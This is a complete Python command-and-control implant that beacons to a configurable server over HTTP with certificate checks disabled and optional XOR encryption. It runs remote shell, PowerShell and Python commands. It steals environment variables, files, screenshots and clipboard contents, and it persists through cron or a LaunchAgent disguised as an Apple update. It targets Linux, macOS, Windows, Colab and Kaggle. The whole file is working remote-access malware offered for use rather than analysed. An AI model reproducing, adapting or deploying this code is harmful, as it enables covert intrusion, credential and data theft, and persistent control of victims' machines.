#!/usr/bin/env python3
"""C2 Universal Agent — auto-detects platform, works on Linux/macOS/Windows/Colab/Kaggle."""

import os, sys, json, time, socket, platform, subprocess, uuid, threading, base64, struct, ssl
from urllib.request import Request, urlopen, HTTPSHandler, build_opener
from urllib.error import URLError
from base64 import b64encode, b64decode

# ─── Configuration (auto-injected by server) ──────────────────────────────────
C2_URL   = os.environ.get("C2_URL",    "http://CHANGE_ME:443")
AGENT_ID = os.environ.get("AGENT_ID",  str(uuid.uuid4()))
SLEEP    = int(os.environ.get("SLEEP",  "5"))
JITTER   = int(os.environ.get("JITTER", "10"))
ENC_KEY  = os.environ.get("ENC_KEY",   "")
AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "")

# ─── Crypto ───────────────────────────────────────────────────────────────────
def xor_crypt(data: bytes, key: bytes) -> bytes:
    kl = len(key)
    return bytes(b ^ key[i % kl] for i, b in enumerate(data))

# ─── Platform detection ───────────────────────────────────────────────────────
def detect_platform():
    if os.environ.get("COLAB_GPU") or os.path.exists("/content/drive"):
        return "colab"
    if os.environ.get("KAGGLE_URL_BASE") or os.path.exists("/kaggle"):
        return "kaggle"
    if sys.platform == "win32":
        return "windows"
    if sys.platform == "darwin":
        return "macos"
    try:
        cg = open("/proc/1/cgroup").read()
        if any(x in cg for x in ("docker", "kubepod", "containerd", "lxc")):
            return "container"
    except Exception:
        pass
    try:
        r = subprocess.check_output("systemd-detect-virt 2>/dev/null || echo none", shell=True, timeout=3).decode().strip()
        if r not in ("none", ""):
            return "vm"
    except Exception:
        pass
    if any(x in platform.node().lower() for x in ["aws", "gcp", "azure", "ec2", "cloud"]):
        return "cloud"
    return "machine"

# ─── Network ──────────────────────────────────────────────────────────────────
def get_internal_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def http_post(path, data):
    payload_str = json.dumps(data)
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    if AUTH_TOKEN:
        headers["X-Auth-Token"] = AUTH_TOKEN
    if ENC_KEY:
        body = b64encode(xor_crypt(payload_str.encode(), ENC_KEY.encode())).decode()
        headers["X-Enc"] = "1"
        headers["Content-Type"] = "text/plain"
    else:
        body = payload_str

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    opener = build_opener(HTTPSHandler(context=ctx))

    req = Request(f"{C2_URL}{path}", data=body.encode(), headers=headers)
    resp = opener.open(req, timeout=15)
    raw = resp.read()

    if ENC_KEY and resp.headers.get("Content-Type", "").startswith("text/plain"):
        try:
            return json.loads(xor_crypt(b64decode(raw), ENC_KEY.encode()).decode())
        except Exception:
            pass
    return json.loads(raw)

# ─── System info ──────────────────────────────────────────────────────────────
def collect_sysinfo():
    info = {
        "cpu_count": os.cpu_count(),
        "hostname": socket.gethostname(),
        "platform": platform.platform(),
        "python": platform.python_version(),
        "cwd": os.getcwd(),
        "user": "",
        "env_vars": list(os.environ.keys()),
    }
    try:
        info["user"] = subprocess.check_output("whoami", shell=True, timeout=5).decode().strip()
    except Exception:
        pass
    try:
        with open("/proc/meminfo") as f:
            for line in f:
                if line.startswith("MemTotal"):
                    info["mem_total_mb"] = int(line.split()[1]) // 1024
                    break
    except Exception:
        pass
    try:
        r = subprocess.check_output("nvidia-smi --query-gpu=name,memory.total,utilization.gpu --format=csv,noheader 2>/dev/null", shell=True, timeout=5).decode().strip()
        if r:
            info["gpu"] = r
    except Exception:
        pass
    try:
        st = os.statvfs("/")
        info["disk_free_gb"] = round((st.f_bavail * st.f_frsize) / (1024 ** 3), 1)
    except Exception:
        pass
    return info

# ─── Registration ─────────────────────────────────────────────────────────────
def register():
    pt = detect_platform()
    os_name = f"macOS {platform.mac_ver()[0]}" if pt == "macos" else f"{platform.system()} {platform.release()}"
    info = {
        "id": AGENT_ID,
        "hostname": socket.gethostname(),
        "username": subprocess.check_output("whoami 2>/dev/null || echo unknown", shell=True, timeout=5).decode().strip(),
        "os": os_name,
        "arch": platform.machine(),
        "ip_internal": get_internal_ip(),
        "platform_type": pt,
    }
    return http_post("/api/agent/register", info)

# ─── Task execution ───────────────────────────────────────────────────────────
def execute_task(task):
    tt = task.get("task_type", "cmd")
    payload = task.get("payload", "")
    result = ""

    try:
        if tt == "cmd":
            result = subprocess.check_output(payload, shell=True, stderr=subprocess.STDOUT, timeout=300).decode(errors="replace")

        elif tt == "powershell":
            result = subprocess.check_output(
                ["powershell", "-ExecutionPolicy", "Bypass", "-Command", payload],
                stderr=subprocess.STDOUT, timeout=300
            ).decode(errors="replace")

        elif tt == "python":
            import io
            buf = io.StringIO()
            old_out = sys.stdout
            sys.stdout = buf
            try:
                exec(compile(payload, "<c2>", "exec"), {"__builtins__": __builtins__})
                result = buf.getvalue() or "executed (no output)"
            finally:
                sys.stdout = old_out

        elif tt == "sysinfo":
            result = json.dumps(collect_sysinfo(), indent=2)

        elif tt == "env":
            result = "\n".join(f"{k}={v}" for k, v in sorted(os.environ.items()))

        elif tt == "ls":
            target = payload.strip() or "."
            result = "\n".join(
                f"{'d' if os.path.isdir(os.path.join(target, x)) else '-'} {x}"
                for x in sorted(os.listdir(target))
            )

        elif tt == "upload":
            parts = payload.split("|", 1)
            if len(parts) == 2:
                path, b64data = parts
                os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
                with open(path, "wb") as f:
                    f.write(base64.b64decode(b64data))
                result = f"Written {len(base64.b64decode(b64data))} bytes to {path}"

        elif tt == "download":
            if os.path.exists(payload):
                with open(payload, "rb") as f:
                    data = f.read()
                result = f"[b64:{payload}] " + b64encode(data).decode()
            else:
                result = f"File not found: {payload}"

        elif tt == "screenshot":
            try:
                import mss, mss.tools
                with mss.mss() as sct:
                    sct.shot(output="/tmp/.c2screen.png")
                with open("/tmp/.c2screen.png", "rb") as f:
                    result = "[b64:/tmp/.c2screen.png] " + b64encode(f.read()).decode()
            except ImportError:
                if sys.platform == "darwin":
                    subprocess.run(["screencapture", "-x", "/tmp/.c2screen.png"], timeout=10)
                    with open("/tmp/.c2screen.png", "rb") as f:
                        result = "[b64:/tmp/.c2screen.png] " + b64encode(f.read()).decode()
                else:
                    result = "mss not installed; run: pip install mss"

        elif tt == "persist":
            plat = detect_platform()
            script = os.path.abspath(__file__)
            if plat in ("linux", "machine", "cloud", "vm", "container", "colab", "kaggle"):
                cron_line = f"@reboot python3 {script} >/dev/null 2>&1 &"
                os.system(f'(crontab -l 2>/dev/null | grep -v "{script}"; echo "{cron_line}") | crontab -')
                result = f"Persistence added via crontab: {cron_line}"
            elif plat == "macos":
                plist = os.path.expanduser("~/Library/LaunchAgents/com.apple.system.update.plist")
                content = f"""<?xml version="1.0"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.system.update</string>
<key>ProgramArguments</key><array><string>python3</string><string>{script}</string></array>
<key>RunAtLoad</key><true/><key>KeepAlive</key><true/>
</dict></plist>"""
                os.makedirs(os.path.dirname(plist), exist_ok=True)
                open(plist, "w").write(content)
                os.system(f"launchctl load {plist} 2>/dev/null")
                result = f"LaunchAgent installed: {plist}"
            else:
                result = f"Persistence not implemented for platform: {plat}"

        elif tt == "kill":
            script = os.path.abspath(__file__)
            os.system(f'crontab -l 2>/dev/null | grep -v "{script}" | crontab - 2>/dev/null')
            os.system("launchctl remove com.apple.system.update 2>/dev/null")
            result = "Agent terminating"
            try:
                http_post("/api/agent/result", {"task_id": task["id"], "result": result})
            except Exception:
                pass
            sys.exit(0)

        elif tt == "net":
            try:
                result = subprocess.check_output(
                    "ip a 2>/dev/null || ifconfig 2>/dev/null || ipconfig 2>/dev/null",
                    shell=True, timeout=10
                ).decode(errors="replace")
                routes = subprocess.check_output(
                    "ip route 2>/dev/null || netstat -rn 2>/dev/null",
                    shell=True, timeout=10
                ).decode(errors="replace")
                result += "\n--- ROUTES ---\n" + routes
            except Exception as e:
                result = f"[net error] {e}"

        elif tt == "clipboard":
            result = subprocess.check_output(
                "xclip -selection clipboard -o 2>/dev/null || xsel --clipboard 2>/dev/null || pbpaste 2>/dev/null || powershell -c 'Get-Clipboard' 2>/dev/null || echo 'no clipboard tool'",
                shell=True, timeout=5
            ).decode(errors="replace")

        elif tt == "ps":
            result = subprocess.check_output(
                "ps aux 2>/dev/null || tasklist 2>/dev/null",
                shell=True, timeout=10
            ).decode(errors="replace")

        else:
            result = f"Unknown task type: {tt}"

    except subprocess.TimeoutExpired:
        result = "[timeout exceeded]"
    except Exception as e:
        result = f"[error] {type(e).__name__}: {e}"

    return result[:65000] + ("\n[...truncated]" if len(result) > 65000 else "")

# ─── Beacon loop ──────────────────────────────────────────────────────────────
def beacon_loop():
    import random
    while True:
        try:
            resp = http_post("/api/agent/beacon", {"id": AGENT_ID})
            for task in resp.get("tasks", []):
                try:
                    result = execute_task(task)
                    http_post("/api/agent/result", {"task_id": task["id"], "result": result})
                except Exception as e:
                    try:
                        http_post("/api/agent/result", {"task_id": task["id"], "result": f"[agent error] {e}"})
                    except Exception:
                        pass
        except Exception:
            pass
        jitter_s = SLEEP * JITTER / 100
        time.sleep(max(1, SLEEP + __import__("random").uniform(-jitter_s, jitter_s)))

# ─── Entry point ──────────────────────────────────────────────────────────────
if __name__ == "__main__":
    while True:
        try:
            register()
            break
        except Exception:
            time.sleep(10)
    beacon_loop()
else:
    # Imported (Colab/Jupyter cell exec)
    register()
    threading.Thread(target=beacon_loop, daemon=True).start()
